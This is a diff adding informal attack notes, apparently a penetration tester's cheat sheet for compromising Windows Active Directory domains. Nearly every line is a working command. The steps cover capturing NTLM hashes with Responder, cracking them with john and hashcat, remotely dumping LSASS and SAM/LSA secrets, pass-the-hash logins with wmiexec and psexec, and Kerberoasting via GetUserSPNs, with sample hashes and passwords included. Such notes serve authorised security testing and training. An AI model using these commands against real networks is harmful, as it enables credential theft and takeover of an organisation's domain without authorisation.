@@ -1,0 +1,67 @@
+https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet
+
+
+sudo apt install impacket-scripts
+
+
+
+
+
+Understand where are you at, and what segement you recieved : 
+
+netdiscover -r ip/prefix
+
+crackmapexec smb IP/prefix --gen-relay-list ./endpoints
+
+Check for old versions of smb. without singing condition
+check and save in notes the DC's IP, save the Server versions, save the domain name, save all the information.
+
+
+MITM attacks / NTLM relay. Responder
+Open the responder -I eth0 
+and a wait for NT hashes.
+
+save the hash to the file 
+echo "hash" > hash.txt
+Crack the hash
+
+john hash.txt --wordlist=rockyou.txt
+
+Use the credentials that found :
+crackmapexec smb -p password -u user -d domain.local IP/prefix 
+
+Check for pwn3d in DC if there is a local administrator dump all the lsass.exe proccess information remotely and pass the hash if possible.
+
+And if there are. Use lsassy to dump remotely the lsass memory saved credentials:
+─$ lsassy -u pc8 -p Aa123456 -d domain.co.il 10.100.102.0/24 --keep-dump
+
+OR 
+
+crackmapexec smb -p password -u user -d domain.local IP/prefix     |  in order to dump secrets --lsa or --sam 
+
+
+passthehash
+
+└─$ wmiexec.py -hashes ":47bf8039a8506cd67c524a03ff84ba4e" Administrator@10.100.102.173
+└─$ psexec.py administrator@10.100.102.173 -hashes :47bf8039a8506cd67c524a03ff84ba4e
+
+
+Kerberoasting :
+
+Use the responder's credentials and pass them in the impaacket tool that can request the TGS from the user as a service SPN Service Principal Name.
+
+└─# ./GetUserSPNs.py -request -dc-ip 10.100.102.173 domain.local/pc8:Aa123456
+
+Use hashcat in order to understand which module to use , usually on 23 etype
+hashcat --help | grep "23" 
+13100 
+hashcat -m 13100 copiedtgshash -a 0 rockyou.txt --force --potfile-disable
+
+After cracking the password, forward it to the DC to potential have administrator.
+Can be used with msfconsole psexec module or manually with the command intself.
+
+psexec.py [[domain/]username[:password]@]<targetName or address>
+
+https://tools.thehacker.recipes/impacket/examples/getuserspns.py
+
+
